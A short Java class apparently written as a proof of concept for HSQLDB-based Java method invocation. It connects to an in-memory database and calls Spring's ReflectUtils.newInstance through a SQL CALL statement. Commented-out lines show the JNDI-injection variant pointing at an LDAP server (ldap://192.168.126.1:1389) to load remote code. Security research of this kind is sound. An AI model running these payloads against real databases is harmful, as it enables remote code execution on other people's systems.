package com.example;

import java.sql.Connection;
import java.sql.DriverManager;

public class hsql {
    public static void main(String[] args) throws Exception {
        Class<?> aClass = Class.forName("org.hsqldb.jdbc.JDBCDriver");
        String dburl = "jdbc:hsqldb:mem";
        Connection connection = DriverManager.getConnection(dburl, "sa", "");
//        connection.prepareStatement("CALL \"org.springframework.cglib.core.ReflectUtils.newInstance\"('ldap://192.168.126.1:1389/0r1wr1')").executeQuery();
//        connection.prepareStatement("CALL \"javax.naming.InitialContext.doLookup\"('ldap://192.168.126.1:1389/9uds7l')").executeQuery();
        String prepare = "CALL \"org.springframework.cglib.core.ReflectUtils.newInstance\"('String.class')";
        connection.prepareStatement(prepare).executeQuery();
    }
}
